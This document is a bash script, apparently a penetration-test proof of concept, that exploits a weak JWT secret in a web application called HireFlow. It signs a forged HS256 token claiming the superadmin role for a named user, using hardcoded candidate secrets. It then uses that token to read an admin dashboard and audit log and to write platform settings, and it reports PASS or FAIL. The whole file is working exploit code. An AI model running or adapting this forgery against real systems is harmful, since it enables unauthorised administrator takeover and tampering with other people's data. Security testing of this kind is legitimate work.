#!/usr/bin/env bash
# Chain A: Zero-auth superadmin takeover via JWT forgery (a04-f01 / a02-f06)
# Forge a superadmin HS256 JWT with the known-weak JWT_SECRET, then use it to:
#   1. Pass /api/auth/me as alice.admin (superadmin)
#   2. Read admin dashboard (normally admin-only)
#   3. Read privileged audit-log (superadmin-only in source)
#   4. Write platform settings (superadmin-only)
# Prerequisite: the running container has JWT_SECRET=hireflow-jwt-secret-2024
#   (Also the source-code fallback is 'hireflow2024api' — we try both.)

set -uo pipefail
set -a; source /tmp/tokens.env; set +a

TARGET="${TARGET_URL:-http://localhost:3000}"
SUPER_ID="f70c491e-8c1e-4ebd-a598-48dccb15da89"
SUPER_EMAIL="alice.admin@hireflow.com"
SECRETS=("hireflow-jwt-secret-2024" "hireflow2024api")

b64url() {
  # portable base64url, strips padding
  openssl base64 -A | tr '+/' '-_' | tr -d '='
}

forge() {
  local SECRET="$1"
  local NOW; NOW=$(date +%s)
  local EXP=$((NOW + 86400))
  local HDR; HDR=$(printf '{"alg":"HS256","typ":"JWT"}' | b64url)
  local PAY; PAY=$(printf '{"id":"%s","email":"%s","role":"superadmin","walletBalance":"0","iat":%s,"exp":%s}' \
    "$SUPER_ID" "$SUPER_EMAIL" "$NOW" "$EXP" | b64url)
  local MSG="${HDR}.${PAY}"
  local SIG; SIG=$(printf '%s' "$MSG" | openssl dgst -sha256 -hmac "$SECRET" -binary | b64url)
  printf '%s.%s' "$MSG" "$SIG"
}

echo "=== Chain A: JWT Forgery -> Superadmin Takeover ==="
FORGED=""
for S in "${SECRETS[@]}"; do
  T=$(forge "$S")
  RESP=$(curl -s -H "Authorization: Bearer $T" "$TARGET/api/auth/me")
  if echo "$RESP" | grep -q '"role":"superadmin"'; then
    echo "[+] Secret '${S}' accepted; forged token passes /api/auth/me as superadmin"
    FORGED="$T"
    break
  else
    echo "[-] Secret '${S}' rejected"
  fi
done

if [[ -z "$FORGED" ]]; then
  echo "FAIL: no known secret accepted"
  exit 1
fi

echo
echo "--- Step 1: /api/auth/me as superadmin ---"
curl -s -H "Authorization: Bearer $FORGED" "$TARGET/api/auth/me" | head -c 400
echo

echo
echo "--- Step 2: /api/admin/dashboard (admin-only) ---"
HTTP1=$(curl -s -o /tmp/chainA_dash.json -w '%{http_code}' -H "Authorization: Bearer $FORGED" "$TARGET/api/admin/dashboard")
echo "HTTP=$HTTP1"
head -c 300 /tmp/chainA_dash.json; echo

echo
echo "--- Step 3: /api/admin/audit-log (superadmin-only) ---"
HTTP2=$(curl -s -o /tmp/chainA_audit.json -w '%{http_code}' -H "Authorization: Bearer $FORGED" "$TARGET/api/admin/audit-log")
echo "HTTP=$HTTP2"
head -c 400 /tmp/chainA_audit.json; echo

echo
echo "--- Step 4: PUT /api/admin/settings (superadmin-only write) ---"
KEY="pentest_marker_$(date +%s)"
HTTP3=$(curl -s -o /tmp/chainA_settings.json -w '%{http_code}' -X PUT \
  -H "Authorization: Bearer $FORGED" \
  -H 'Content-Type: application/json' \
  -d "{\"key\":\"$KEY\",\"value\":\"owned-by-pentest\"}" \
  "$TARGET/api/admin/settings")
echo "HTTP=$HTTP3"
head -c 300 /tmp/chainA_settings.json; echo

echo
echo "=== VERDICT ==="
OK=0
[[ "$HTTP1" = "200" ]] && ((OK++))
[[ "$HTTP2" = "200" ]] && ((OK++))
[[ "$HTTP3" =~ ^(200|201)$ ]] && ((OK++))
if (( OK >= 2 )); then
  echo "PASS: forged superadmin token authenticated and reached $OK/3 privileged endpoints."
  exit 0
else
  echo "FAIL: only $OK/3 privileged endpoints reachable."
  exit 1
fi
